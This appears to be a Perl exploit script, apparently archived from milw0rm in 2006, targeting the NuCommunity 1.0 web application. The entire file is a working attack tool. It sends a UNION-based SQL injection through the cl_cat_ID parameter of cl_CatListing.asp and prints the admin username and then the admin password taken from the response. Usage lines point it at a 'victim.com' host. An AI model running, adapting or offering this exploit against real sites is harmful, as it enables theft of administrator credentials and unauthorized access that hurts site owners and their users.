#!/usr/bin/perl
#[Script Name: NuCommunity 1.0 (cl_CatListing.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(

use IO::Socket;
if(@ARGV < 3){
print "
[========================================================================
[//  NuCommunity 1.0 (cl_CatListing.asp) Remote SQL Injection Exploit
[//           Usage: exploit.pl [target] [path] [userid]
[//                   Example: exploit.pl victim.com / 1
[//                   Example: exploit.pl victim.com /path/ 1
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$dir = $ARGV[1];
$file = "cl_CatListing.asp?cl_cat_ID=";
$target = "-1%20union%20select%200,0,0,admin_user%20from%20admin+where+admin_id%20like%20".$ARGV[2];
$target = $host.$dir.$file.$target;

$targettwo = "-1%20union%20select%200,0,0,admin_password%20from%20admin+where+admin_id%20like%20".$ARGV[2];
$targettwo = $host.$dir.$file.$targettwo;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /t size=\"2\">(.*?)<\/font>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";

print "+**********************************************************************+\n";
print "+ Trying to connect for Password: $server\n";
$socket1 = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket1 "GET $targettwo\n";
print $socket1 "Host: $server\n";
print $socket1 "Accept: */*\n";
print $socket1 "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket1>) {
if ($answer =~ /t size=\"2\">(.*?)<\/font>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Password: $1\n";
print "+**********************************************************************+\n";
exit();
}


if ($answer =~ /Ad removed or not yet approved/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }
   } 
    }
print "+ Exploit failed :(\n";
print "+**********************************************************************+\n";

# milw0rm.com [2006-11-11]
